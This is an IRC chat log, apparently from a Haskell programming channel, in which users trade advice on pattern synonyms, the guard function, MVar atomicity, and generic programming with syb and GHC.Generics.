21:35:19 <uiop> it's just a matter of running over your mental representation of what's going on wrt evalutation, identifying where the blow up could be occuring, then narrowing it down (if there's even more than one possibility once you've arrived at this step)
21:58:37 <orzo> can i define a pattern synonym that matches (k,p,_) when used as a pattern, but (k,p,k) when used as data?
22:10:14 <orzo> pattern k :-> p <- (k,p,_) where k :-> p = (k,p,k)
22:10:27 <orzo> that's an attempt, but it gives a type error because it canot infer the _ is the right type
22:12:28 <glguy> orzo: pattern (:->) :: a -> b -> (a,b,a)
22:12:28 <glguy> pattern k :-> p <- (k,p,_) where k :-> p = (k,p,k)
22:14:32 <orzo> thanks
22:14:45 <orzo> first i was trying to get it to infer using a | guard
22:14:51 <orzo> it says syntax error
22:14:58 <orzo> i guess we cant put guards on pattern synonyms?
22:17:41 <fragamus> speaking of guards... I have a stream     :: Shell Text         and I want to put a guard on it          
22:19:36 <glguy> orzo: Correct
22:20:07 <glguy> fragamus: go nuts
22:21:28 <fragamus> i tried. gabriel says Shell is a combination of list monad and IO and managed but it does seem to be a little more involved 
22:22:36 <liste> :t guard
22:22:38 <lambdabot> Alternative f => Bool -> f ()
22:23:11 <liste> and Shell has an Alternative instance
22:24:09 <osa1> say I have two threads running `modifyMVar_ mvar (\a -> return (a + 1))` and mvar content is initailly 0, I can read 1 after both threads terminate, right?
22:24:26 <glguy> orzo was talking about (pipe) | guards on definitions, were you talking about that or the "guard" function, fragamus?
22:24:36 <osa1> the documentation says "only atomic if there's only one producer" and I'm guessing that's what it means
22:25:00 <fragamus> yes the guard function
22:25:21 <glguy> osa1: It would be atomic
22:25:29 <glguy> There's only one producer, the initial newMVar
22:25:55 <glguy> modifyMVar_ blocks until it's able to take the mvar and puts it back when done
22:26:21 <glguy> It takes before it puts, so it doesn't compromise your atomicity
22:26:49 <osa1> glguy: got it, thanks. I'm a bit confused about what does "atomic" in this context (in the documentation) means
22:26:52 <uiop> so it would be "2" if you're reading after both threads terminate, no?
22:27:39 <uiop> well, after both threads complete the put part of the operation
22:29:38 <glguy> osa1: The documentation is trying to explain that so long as you aren't using any extra putMVars that all code guarded by modifyMVar_ can only be executing on any one thread
22:29:58 <glguy> It's atomic in that no two threads will get the same value out of the mvar before another puts it back
22:30:09 <osa1> got it, thanks glguy
22:30:15 <glguy> similar to atomicModifyIORef, except that you can perform arbitrary IO in the critical section
22:40:22 <dramforever> Wait. You can't, right?
22:40:23 <dramforever> http://hackage.haskell.org/package/base-4.9.1.0/docs/Data-IORef.html#v:atomicModifyIORef
22:41:46 <glguy> The limitation of atomicModifyIORef, unlike modifyMVar_, is that atomicModifyIORef can't do the arbitrary IO
22:42:01 <dramforever> Oh, sorry I misread that
22:42:12 <orzo> when cabal reconfigures with the most recently used options, it should print the options
22:46:34 <saurabhnanda> just broadcasting this here -- https://www.reddit.com/r/haskell/comments/5qfd36/instrumentation_without_required_application/
22:48:48 <dmj`> glguy: hmm, would be nice if there was something like modify_ m f = modifyMVar_ m $ \x -> pure (f x)
22:49:21 <glguy> modifyMVar_ m (pure . f) for now I guess
22:50:48 <glguy> How about? modifyMVar_ m (\x -> do let {x' = f x}; forkIO (evaluate x'); return x')
22:51:00 <glguy> so you can let go of the mvar quickly and force it in another thread :)
22:56:11 <dmj`> ah :) that’s nice
22:58:23 <glguy> or perhaps par and that family would be better for that
23:14:12 <tippenein> I'm looking for something like guard (isJust maybeSomething) >>= \something -> ...
23:16:08 <glguy> maybe mzero <...> maybeSomething 
23:16:10 <glguy> behaving like that?
23:18:48 <tippenein> yeah, sorta like that. I'm sure I can finagle the function to be last arg
23:19:34 <glguy> if you didn't want the mzero behavior there's for_
23:20:57 <mrkgnao> this seems like a bad idea, and probably breaks the type system's guarantees and such, but is there a sane way to write a function that unwraps a type constructor?
23:21:21 <glguy> mrkgnao: what does that mean to you?
23:21:29 <mrkgnao> something such that forall SomeType. f (SomeType k) == k
23:21:33 <mrkgnao> in pseudo-Haskell
23:21:54 <mrkgnao> pretty sure that's impossible for some stupid reason I'm overlooking
23:22:21 <glguy> no, just because a type has a k parameter it doesn't mean there are any k typed values to get
23:22:21 <mrkgnao> I'd guess at a type like unwrapper :: (forall x. x -> f x) -> f a -> a
23:22:51 <mrkgnao> what about for a simple non-sum type?
23:22:59 <mrkgnao> like data T a = T a
23:23:19 <glguy> you could do it using the Data instance
23:23:29 <glguy> or using the Generics instance
23:23:44 <glguy> but not parametrically in all types
23:23:56 <mrkgnao> could you make an unwrapper for such types? in general, can you write functions that work according to the "shapes" of the datatypes? (which would probably be analogous to kinds, but for the types, not the constructors)
23:24:01 <glguy> and you'd get a Maybe k
23:24:45 <glguy> syb and ghc.generics are your search terms
23:24:47 <mrkgnao> so this is where the evil type-level programming begins.
23:25:09 <mrkgnao> haha, I'm not really looking to do this, I was just curious. thanks though! :)
23:27:26 <mrkgnao> glguy: what would an application of such things be?
23:27:58 <mrkgnao> I've noticed intero installs this syb package, but that's as far as I've come to encountering any of these in my short time with the language so far.
23:31:48 <glguy> maybe you have a big AST and you want to query what are all the Name typed values in an Expression
23:59:56 <zipper> Hello, so I have a question regarding resource usage and the various "string" types. In say Network.Wreq when I get from a URL and get a lazy bytestring what exactly does that mean?
